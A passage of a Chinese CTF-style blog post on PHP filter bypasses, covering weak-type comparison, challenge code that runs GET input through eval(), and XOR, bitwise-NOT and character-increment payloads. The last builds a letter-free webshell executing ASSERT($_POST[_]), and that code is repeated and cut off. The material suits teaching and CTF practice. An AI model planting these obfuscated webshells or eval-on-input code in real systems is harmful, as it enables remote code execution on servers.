variable">$number</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">>=</span> <span class="token variable">$one</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">&lt;=</span> <span class="token variable">$nine</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$number</span> <span class="token operator">==</span> <span class="token string">'11259375'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用11259375的16进制形式0xabcdef</p><h2 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token variable">$num</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">echo</span> <span class="token string">'flag{**********}'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如”1x”=1,”22asd”=22,”qwe123”=0</p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><h3 id="方法一：异或"><a href="#方法一：异或" class="headerlink" title="方法一：异或"></a>方法一：异或</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"flagxxxxxxx"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//$hint =  "php function getFlag() to get flag";</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>?code=$_=”&lt;%)},?’”^”[@];@^@”;$_();  </p></blockquote><p>两句php代码，第一句 $_=” &lt;%)},?’ “ ^ “ [@];@^@ “; 是把两个字符串异或运算结果赋给$_变量，” &lt;%)},?’ “ 这个含7个字符的字符串和 “ [@];@^@ “ 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${“ } “ ^ “ ; “} = “ &lt;%)},?’ “ ^ “ [@];@^@ “;  ${“ } “ ^ “ ; “}();</p><h3 id="–方法二：取反"><a href="#–方法二：取反" class="headerlink" title="–方法二：取反"></a>–方法二：取反</h3><p>“如何编写一个不使用数字和字母的webshell”，具体为如下代码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[a-z0-9]/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>"\x8c"</code>，其取反即为字母<code>s</code></p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg" alt="14872686600768.jpg"></p><p>利用这个特性生成如下答案：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token operator">></span><span class="token string">'&lt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token operator">/</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"和"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"的"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"半"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"始"</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"俯"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"瞰"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$__</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"次"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token string">"站"</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token variable">$___</span><span class="token punctuation">{</span><span class="token variable">$_</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$_____</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg" alt="14871906748025.jpg"></p><p>这个答案还利用了PHP的弱类型特性。因为要获取<code>'和'{2}</code>，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故<code>true+true==2</code>，也就是<code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code>。</p><h3 id="–方法三：字符变量自增"><a href="#–方法三：字符变量自增" class="headerlink" title="–方法三：字符变量自增"></a>–方法三：字符变量自增</h3><p>题目源代码在方法二中</p><p><img src="https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png" alt="image-20201021010048673"></p><p>也就是说，<code>'a'++ =&gt; 'b'</code>，<code>'b'++ =&gt; 'c'</code>… </p><p>所以，只要能拿到一个变量，其值为<code>a</code>，通过自增操作即可获得a-z中所有字符。</p><p>那么，如何拿到一个值为字符串’a’的变量呢？</p><p>巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为<code>Array</code>：</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg" alt="14872697183159.jpg"></p><p>再取这个字符串的第一个字母，就可以获得’A’了。</p><p>利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是<code>ASSERT($_POST[_])</code>，无需获取小写a）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// E </span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// R</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// P</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// O</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// T</span><span class="token variable">$____</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>$<span class="token variable">$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span>_<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ASSERT($_POST[_]);&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string">"$_"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_='Array';</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// $_=$_[0];</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// A</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// S</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// E </span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// R</span><span class="token variable">$___</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token variable">$__</span><span 